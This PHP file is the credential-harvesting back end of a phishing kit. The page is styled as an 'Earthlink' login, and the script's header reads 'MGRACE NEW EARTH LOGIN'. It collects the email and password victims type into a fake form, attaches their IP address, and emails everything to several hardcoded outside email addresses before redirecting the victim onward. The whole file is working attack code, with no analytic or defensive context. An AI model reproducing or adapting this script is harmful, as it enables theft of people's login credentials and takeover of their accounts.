<?php

include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

$message  = "------------------+ MGRACE NEW EARTH LOGIN +-----------------\n";
$message .= "Email Address: ".$_POST['1']."\n";
$message .= "Password: ".$_POST['2']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ Created in 2020 [ Donflow ] +--------------------\n";

$recipient = "wtrade44789@gmail.com, wjeffx@outlook.com,wtrade44789@outlook.com";
$subject = "MGRACE EARTHLINK LOGIN RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "MGRACE-LOGIN";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: 3refd.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        